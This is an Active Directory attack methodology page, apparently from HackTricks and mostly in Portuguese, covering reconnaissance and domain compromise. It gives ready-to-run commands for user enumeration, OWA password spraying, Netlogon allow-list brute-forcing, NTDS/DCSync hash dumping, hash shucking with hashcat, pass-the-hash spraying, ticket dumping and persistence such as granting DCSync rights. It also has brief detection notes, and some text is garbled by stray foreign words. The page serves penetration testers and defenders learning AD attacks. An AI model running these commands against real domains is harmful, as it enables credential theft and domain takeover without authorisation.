# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## Visão geral básica

**Active Directory** serve como uma tecnologia fundamental, permitindo que **network administrators** criem e gerenciem com eficiência **domains**, **users** e **objects** dentro de uma rede. Ele foi projetado para escalar, facilitando a organização de um grande número de usuários em **groups** e **subgroups** gerenciáveis, enquanto controla os **access rights** em vários níveis.

A estrutura do **Active Directory** é composta por três camadas principais: **domains**, **trees** e **forests**. Um **domain** abrange uma coleção de objetos, como **users** ou **devices**, que compartilham um banco de dados comum. **Trees** são grupos desses domains ligados por uma estrutura compartilhada, e uma **forest** representa a coleção de múltiplas trees, interconectadas por **trust relationships**, formando a camada mais alta da estrutura organizacional. **Access** e direitos de **communication** específicos podem ser designados em cada um desses níveis.

Os principais conceitos dentro do **Active Directory** incluem:

1. **Directory** – Armazena todas as informações relacionadas aos objetos do Active Directory.
2. **Object** – Denota entidades dentro do directory, incluindo **users**, **groups** ou **shared folders**.
3. **Domain** – Serve como um contêiner para objetos do directory, com a capacidade de vários domains coexistirem em uma **forest**, cada um mantendo sua própria coleção de objetos.
4. **Tree** – Um agrupamento de domains que compartilham um domain raiz comum.
5. **Forest** – O ápice da estrutura organizacional no Active Directory, composta por várias trees com **trust relationships** entre elas.

**Active Directory Domain Services (AD DS)** abrange uma gama de serviços críticos para o gerenciamento centralizado e a comunicação dentro de uma rede. Esses serviços incluem:

1. **Domain Services** – Centraliza o armazenamento de dados e gerencia as interações entre **users** e **domains**, incluindo funcionalidades de **authentication** e **search**.
2. **Certificate Services** – Supervisiona a criação, distribuição e gerenciamento de **digital certificates** seguros.
3. **Lightweight Directory Services** – Suporta aplicações habilitadas para directory por meio do **LDAP protocol**.
4. **Directory Federation Services** – Fornece recursos de **single-sign-on** para autenticar usuários em múltiplas aplicações web em uma única sessão.
5. **Rights Management** – Ajuda a proteger material com copyright, regulando sua distribuição e uso não autorizados.
6. **DNS Service** – Crucial para a resolução de **domain names**.

Para uma explicação mais detalhada, confira: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Para aprender como **attack an AD** você precisa **understand** muito bem o **Kerberos authentication process**.\
[**Leia esta página se você ainda não sabe como isso funciona.**](kerberos-authentication.md)

## Cheat Sheet

Você pode consultar bastante coisa em [https://wadcoms.github.io/](https://wadcoms.github.io) para ter uma visão rápida de quais comandos você pode executar para enumerar/explorar um AD.

> [!WARNING]
> A comunicação Kerberos **requer um nome totalmente qualificado (FQDN)** para executar ações. Se você tentar acessar uma máquina pelo endereço IP, **ele usará NTLM e não kerberos**.

## Recon Active Directory (No creds/sessions)

Se você só tem acesso a um ambiente AD, mas não tem credenciais/sessions, você poderia:

- **Pentest the network:**
- Escanear a rede, encontrar máquinas e portas abertas e tentar **exploit vulnerabilities** ou **extract credentials** delas (por exemplo, [printers could be very interesting targets](ad-information-in-printers.md).
- Enumerar DNS pode fornecer informações sobre servidores-chave no domain, como web, printers, shares, vpn, media, etc.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Dê uma olhada na [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) geral para encontrar mais informações sobre como fazer isso.
- **Verifique o acesso null e Guest nos serviços smb** (isso não funcionará em versões modernas do Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Um guia mais detalhado sobre como enumerar um servidor SMB pode ser encontrado aqui:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Um guia mais detalhado sobre como enumerar LDAP pode ser encontrado aqui (preste **atenção especial ao acesso anônimo**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Coletar credenciais [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Acessar host por [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Coletar credenciais **exposing** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Extrair usernames/names de documentos internos, redes sociais, serviços (principalmente web) dentro dos ambientes do domain e também dos dados publicamente disponíveis.
- Se você encontrar os nomes completos dos funcionários da empresa, você pode tentar diferentes convenções de **username AD (**[**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). As convenções mais comuns são: _NameSurname_, _Name.Surname_, _NamSur_ (3 letras de cada), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Ferramentas:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Confira as páginas [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) e [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Quando um **invalid username is requested** o servidor responderá usando o código de erro **Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, permitindo determinar que o username era inválido. **Valid usernames** irão retornar ou o **TGT in a AS-REP** response ou o erro _KRB5KDC_ERR_PREAUTH_REQUIRED_, indicando que o usuário precisa realizar pré-autenticação.
- **No Authentication against MS-NRPC**: Usando auth-level = 1 (No authentication) contra a interface MS-NRPC (Netlogon) nos domain controllers. O método chama a função `DsrGetDcNameEx2` depois de vincular a interface MS-NRPC para verificar se o usuário ou computador existe sem nenhuma credencial. A ferramenta [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementa esse tipo de enumeração. A pesquisa pode ser encontrada [here](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **Servidor OWA (Outlook Web Access)**

Se você encontrou um desses servidores na rede, também pode realizar **enumeração de usuários** contra ele. Por exemplo, você pode usar a ferramenta [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Você pode encontrar listas de usernames neste [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  e neste ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> No entanto, você deve ter o **name of the people working on the company** a partir da etapa de recon que você deveria ter realizado antes disso. Com o nome e o sobrenome, você poderia usar o script [**namemash.py**](https://gist.github.com/superkojiman/11076951) para gerar possíveis usernames válidos.

### Abuso da allow-list do canal vulnerável do Netlogon (Onelogon)

Mesmo após o **Zerologon** ser corrigido no DC, contas explicitamente permitidas na allow-list ainda podem ficar expostas ao comportamento legado/vulnerável do canal seguro do Netlogon. A configuração de risco é a GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** ou o valor de registry correspondente **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Esse valor é um **SDDL security descriptor** (veja [Security Descriptors](security-descriptors.md)). Qualquer conta ou grupo que receba o ACE relevante na DACL pode ser alvo. Por exemplo, `O:BAG:BAD:(A;;RC;;;WD)` efetivamente coloca **Everyone** na allow-list.

Fluxo prático do operador:

1. **Identifique os principals na allow-list** verificando tanto **SYSVOL/GPO** quanto o **registry ativo do DC**.
2. **Resolva SIDs** encontrados no SDDL para usuários/computadores reais do AD e priorize **DC machine accounts**, **trust accounts** e outras máquinas privilegiadas.
3. Tente repetidamente a **autenticação MS-NRPC / Netlogon** como a conta na allow-list.
4. Após um palpite bem-sucedido, abuse do **Netlogon password-setting** para redefinir a senha da conta alvo (o PoC público a define como uma string vazia).

Exemplos rápidos de triagem / laboratório do artifact público:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Notas:

- O **scanner** é útil porque a allow-list efetiva pode existir no **SYSVOL**, no **registry**, ou em ambos.
- A própria rota de exploit é importante porque ela **não requer privilégios de Domain Admin** depois que uma conta vulnerável é identificada.
- Comprometer uma **Domain Controller machine account** como `DC$` é especialmente perigoso porque redefinir essa senha pode habilitar diretamente rotas mais amplas de **AD takeover**.
- A viabilidade de **brute-force** depende do modo: o artifact público descreve uma abordagem meet-in-the-middle, um brute force de **24 bits** quando outra computer account está disponível, e variantes mais lentas de **32 bits**.

Notas de detection / hardening:

- Audite a política de allow-list e remova tudo, exceto exceções temporárias e explicitamente necessárias de compatibilidade.
- Monitore os eventos **System** do DC **5827/5828/5829/5830/5831** para detectar conexões Netlogon vulneráveis sendo negadas, descobertas ou explicitamente permitidas pela política.
- Trate contas em `VulnerableChannelAllowList` como **high-risk** até que a dependência legada seja removida.

### Knowing one or several usernames

Ok, então você já sabe que tem um username válido, mas sem passwords... Então tente:

- [**ASREPRoast**](asreproast.md): Se um user **não tiver** o atributo _DONT_REQ_PREAUTH_, você pode **request a AS_REP message** para esse user que conterá alguns dados encrypted por uma derivation da password do user.
- [**Password Spraying**](password-spraying.md): Vamos tentar as passwords mais **common** com cada um dos users descobertos; talvez algum user esteja usando uma bad password (leve em conta a password policy!).
- Observe que você também pode **spray OWA servers** para tentar obter acesso aos mail servers dos users.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Você pode conseguir **obtain** alguns challenge **hashes** para crack **poisoning** alguns protocolos da **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Se você conseguiu enumerar o active directory, terá **mais emails e uma melhor compreensão da network**. Você pode forçar **relay attacks** de NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) para obter acesso ao ambiente de AD.

### NetExec workspace-driven recon & relay posture checks

- Use **`nxcdb` workspaces** para manter o estado do AD recon por engagement: `workspace create <name>` cria SQLite DBs por protocolo em `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Alterne as views com `proto smb|mssql|winrm` e liste os secrets coletados com `creds`. Remova manualmente os dados sensíveis ao terminar: `rm -rf ~/.nxc/workspaces/<name>`.
- A descoberta rápida de subnet com **`netexec smb <cidr>`** mostra **domain**, **OS build**, **SMB signing requirements** e **Null Auth**. Membros com `(signing:False)` são **relay-prone**, enquanto os DCs frequentemente exigem signing.
- Gere **hostnames em /etc/hosts** diretamente a partir da saída do NetExec para facilitar o targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Quando o **SMB relay para o DC é bloqueado** por signing, ainda verifique a postura de **LDAP**: `netexec ldap <dc>` destaca `(signing:None)` / weak channel binding. Um DC com SMB signing required, mas LDAP signing disabled, continua sendo um alvo viável de **relay-to-LDAP** para abusos como **SPN-less RBCD**.

### Vazamentos de credenciais da impressora no lado do cliente → validação em massa de credenciais do domínio

- UIs de impressora/web às vezes **incorporam senhas de admin mascaradas em HTML**. Ver a source/devtools pode revelar em cleartext (por exemplo, `<input value="<password>">`), permitindo acesso Basic-auth para varrer/repositórios de impressão.
- Jobs de impressão recuperados podem conter **documentos de onboarding em plaintext** com senhas por usuário. Mantenha os pares alinhados ao testar:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

If you can **access other PCs or shares** with the **null or guest user** you could **place files** (like a SCF file) that if somehow accessed will t**rigger an NTLM authentication against you** so you can **steal** the **NTLM challenge** to crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** trata todo NT hash que você já possui como uma candidate password para outros formatos mais lentos cujo material de chave é derivado diretamente do NT hash. Em vez de fazer brute-force em longas passphrases em Kerberos RC4 tickets, NetNTLM challenges, ou cached credentials, você alimenta os NT hashes nos NT-candidate modes do Hashcat e deixa ele validar password reuse sem nunca aprender o plaintext. Isso é especialmente potente após um domain compromise, onde você pode coletar milhares de NT hashes atuais e históricos.

Use shucking quando:

- Você tem um corpus de NT a partir de DCSync, dumps de SAM/SECURITY, ou credential vaults e precisa testar reuse em outros domains/forests.
- Você captura material Kerberos baseado em RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), respostas NetNTLM, ou blobs DCC/DCC2.
- Você quer provar rapidamente reuse para longas passphrases impossíveis de crackear e imediatamente pivot via Pass-the-Hash.

A técnica **não funciona** contra encryption types cujas keys não são o NT hash (por exemplo, Kerberos etype 17/18 AES). Se um domain impõe AES-only, você deve voltar aos password modes normais.

#### Building an NT hash corpus

- **DCSync/NTDS** – Use `secretsdump.py` with history to grab the largest possible set of NT hashes (and their previous values):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries widen dramatically the candidate pool because Microsoft can store up to 24 previous hashes per account. For more ways to harvest NTDS secrets see:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (or Mimikatz `lsadump::sam /patch`) extracts local SAM/SECURITY data and cached domain logons (DCC/DCC2). Deduplicate and append those hashes to the same `nt_candidates.txt` list.
- **Track metadata** – Keep the username/domain that produced each hash (even if the wordlist contains only hex). Matching hashes tell you immediately which principal is reusing a password once Hashcat prints the winning candidate.
- Prefer candidates from the same forest or a trusted forest; that maximizes the chance of overlap when shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **must remain raw 32-hex NT hashes**. Disable rule engines (no `-r`, no hybrid modes) because mangling corrupts the candidate key material.
- These modes are not inherently faster, but the NTLM keyspace (~30,000 MH/s on an M3 Max) is ~100× quicker than Kerberos RC4 (~300 MH/s). Testing a curated NT list is far cheaper than exploring the entire password space in the slow format.
- Always run the **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) because modes 31500/31600/35300/35400 shipped recently.
- There is currently no NT mode for AS-REQ Pre-Auth, and AES etypes (19600/19700) require the plaintext password because their keys are derived via PBKDF2 from UTF-16LE passwords, not raw NT hashes.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture an RC4 TGS for a target SPN with a low-privileged user (see the Kerberoast page for details):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck the ticket with your NT list:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat derives the RC4 key from each NT candidate and validates the `$krb5tgs$23$...` blob. A match confirms that the service account uses one of your existing NT hashes.

3. Immediately pivot via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

You can optionally recover the plaintext later with `hashcat -m 1000 <matched_hash> wordlists/` if needed.

#### Example – Cached credentials (mode 31600)

1. Dump cached logons from a compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copy the DCC2 line for the interesting domain user into `dcc2_highpriv.txt` and shuck it:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. A successful match yields the NT hash already known in your list, proving that the cached user is reusing a password. Use it directly for PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) or brute-force it in fast NTLM mode to recover the string.

The exact same workflow applies to NetNTLM challenge-responses (`-m 27000/27100`) and DCC (`-m 31500`). Once a match is identified you can launch relay, SMB/WMI/WinRM PtH, or re-crack the NT hash with masks/rules offline.



## Enumerating Active Directory WITH credentials/session

For this phase you need to have **compromised the credentials or a session of a valid domain account.** If you have some valid credentials or a shell as a domain user, **you should remember that the options given before are still options to compromise other users**.

Before start the authenticated enumeration you should know what is the **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Having compromised an account is a **big step to start compromising the whole domain**, because you are going to be able to start the **Active Directory Enumeration:**

Regarding [**ASREPRoast**](asreproast.md) you can now find every possible vulnerable user, and regarding [**Password Spraying**](password-spraying.md) you can get a **list of all the usernames** and try the password of the compromised account, empty passwords and new promising passwords.

- You could use the [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- You can also use [**powershell for recon**](../basic-powershell-for-pentesters/index.html) which will be stealthier
- You can also [**use powerview**](../basic-powershell-for-pentesters/powerview.md) to extract more detailed information
- Another amazing tool for recon in an active directory is [**BloodHound**](bloodhound.md). It is **not very stealthy** (depending on the collection methods you use), but **if you don't care** about that, you should totally give it a try. Find where users can RDP, find path to other groups, etc.
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) as they might contain interesting information.
- A **tool with GUI** that you can use to enumerate the directory is **AdExplorer.exe** from **SysInternal** Suite.
- You can also search in the LDAP database with **ldapsearch** to look for credentials in fields _userPassword_ & _unixUserPassword_, or even for _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) for other methods.
- If you are using **Linux**, you could also enumerate the domain using [**pywerview**](https://github.com/the-useless-one/pywerview).
- You could also try automated tools as:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

It's very easy to obtain all the domain usernames from Windows (`net user /domain` ,`Get-DomainUser` or `wmic useraccount get name,sid`). In Linux, you can use: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` or `enum4linux -a -u "user" -p "password" <DC IP>`

> Even if this Enumeration section looks small this is the most important part of all. Access the links (mainly the one of cmd, powershell, powerview and BloodHound), learn how to enumerate a domain and practice until you feel comfortable. During an assessment, this will be the key moment to find your way to DA or to decide that nothing can be done.

### Kerberoast

Kerberoasting involves obtaining **TGS tickets** used by services tied to user accounts and cracking their encryption—which is based on user passwords—**offline**.

More about this in:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Once you have obtained some credentials you could check if you have access to any **machine**. For that matter, you could use **CrackMapExec** to attempt connecting on several servers with different protocols, accordingly to your ports scans.

### Local Privilege Escalation

If you have compromised credentials or a session as a regular domain user and you have **access** with this user to **any machine in the domain** you should try to find your way to **escalate privileges locally and looting for credentials**. This is because only with local administrator privileges you will be able to **dump hashes of other users** in memory (LSASS) and locally (SAM).

There is a complete page in this book about [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) and a [**checklist**](../checklist-windows-privilege-escalation.md). Also, don't forget to use [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

It's very **unlikely** that you will find **tickets** in the current user **giving you permission to access** unexpected resources, but you could check:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Se você conseguiu enumerar o active directory, terá **mais emails e uma melhor compreensão da rede**. Talvez você consiga forçar **relay attacks** do NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Looks for Creds in Computer Shares | SMB Shares

Agora que você tem algumas credenciais básicas, deve verificar se consegue **encontrar** algum **arquivo interessante sendo compartilhado dentro do AD**. Você poderia fazer isso manualmente, mas é uma tarefa repetitiva e muito chata (e ainda mais se você encontrar centenas de docs que precisa verificar).

[**Siga este link para aprender sobre as tools que você pode usar.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Se você conseguir **acessar outros PCs ou shares**, poderia **colocar arquivos** (como um arquivo SCF) que, se acessados de alguma forma, vão t**rigg**er uma autenticação NTLM contra você, para que você possa **roubar** o **challenge NTLM** e quebrá-lo:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Esta vulnerabilidade permitia que qualquer usuário autenticado **comprometesse o domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Para as seguintes técnicas, um usuário comum do domínio não é suficiente; você precisa de alguns privilégios/credenciais especiais para realizar esses attacks.**

### Hash extraction

Com sorte, você conseguiu **comprometer alguma conta local de admin** usando [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) incluindo relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalando privilégios localmente](../windows-local-privilege-escalation/index.html).\
Então, é hora de fazer dump de todos os hashes na memória e localmente.\
[**Leia esta página sobre diferentes maneiras de obter os hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Depois que você tiver o hash de um usuário**, você pode usá-lo para **personificá-lo**.\
Você precisa usar alguma **tool** que **realize** a **autenticação NTLM usando** esse **hash**, **ou** pode criar um novo **sessionlogon** e **injetar** esse **hash** dentro do **LSASS**, para que, quando qualquer **autenticação NTLM for realizada**, esse **hash** seja usado. A última opção é o que o mimikatz faz.\
[**Leia esta página para mais informações.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Este ataque tem como objetivo **usar o hash NTLM do usuário para solicitar tickets Kerberos**, como uma alternativa ao comum Pass The Hash sobre o protocolo NTLM. Portanto, isso pode ser especialmente **útil em redes onde o protocolo NTLM está desabilitado** e apenas **Kerberos é अनुमति?** as authentication protocol.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

No método de ataque **Pass The Ticket (PTT)**, os attackers **roubam o ticket de autenticação de um usuário** em vez da senha ou dos valores de hash. Esse ticket roubado é então usado para **personificar o usuário**, obtendo acesso não autorizado a recursos e serviços dentro de uma rede.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Se você tiver o **hash** ou a **senha** de um **administrador local**, deve tentar fazer **login localmente** em outros **PCs** com ele.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Note that this is quite **ruidoso** and **LAPS** would **mitigar** it.

### MSSQL Abuse & Trusted Links

If a user has privileges to **access MSSQL instances**, he could be able to use it to **execute commands** in the MSSQL host (if running as SA), **steal** the NetNTLM **hash** or even perform a **relay** **attack**.\
Also, if a MSSQL instance is trusted (database link) by a different MSSQL instance. If the user has privileges over the trusted database, he is going to be able to **use the trust relationship to execute queries also in the other instance**. These trusts can be chained and at some point the user might be able to find a misconfigured database where he can execute commands.\
**The links between databases work even across forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Third-party inventory and deployment suites often expose powerful paths to credentials and code execution. See:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

If you find any Computer object with the attribute [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) and you have domain privileges in the computer, you will be able to dump TGTs from memory of every users that logins onto the computer.\
So, if a **Domain Admin logins onto the computer**, you will be able to dump his TGT and impersonate him using [Pass the Ticket](pass-the-ticket.md).\
Thanks to constrained delegation you could even **automatically compromise a Print Server** (hopefully it will be a DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

If a user or computer is allowed for "Constrained Delegation" it will be able to **impersonate any user to access some services in a computer**.\
Then, if you **compromise the hash** of this user/computer you will be able to **impersonate any user** (even domain admins) to access some services.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Having **WRITE** privilege on an Active Directory object of a remote computer enables the attainment of code execution with **elevated privileges**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

The compromised user could have some **interesting privileges over some domain objects** that could let you **move** laterally/**escalate** privileges.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Discovering a **Spool service listening** within the domain can be **abused** to **acquire new credentials** and **escalate privileges**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

If **other users** **access** the **compromised** machine, it's possible to **gather credentials from memory** and even **inject beacons in their processes** to impersonate them.\
Usually users will access the system via RDP, so here you have how to performa couple of attacks over third party RDP sessions:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** provides a system for managing the **local Administrator password** on domain-joined computers, ensuring it's **randomized**, unique, and frequently **changed**. These passwords are stored in Active Directory and access is controlled through ACLs to authorized users only. With sufficient permissions to access these passwords, pivoting to other computers becomes possible.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Gathering certificates** from the compromised machine could be a way to escalate privileges inside the environment:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

If **vulnerable templates** are configured it's possible to abuse them to escalate privileges:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Once you get **Domain Admin** or even better **Enterprise Admin** privileges, you can **dump** the **domain database**: _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Some of the techniques discussed before can be used for persistence.\
For example you could:

- Make users vulnerable to [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Make users vulnerable to [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Grant [**DCSync**](#dcsync) privileges to a user

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

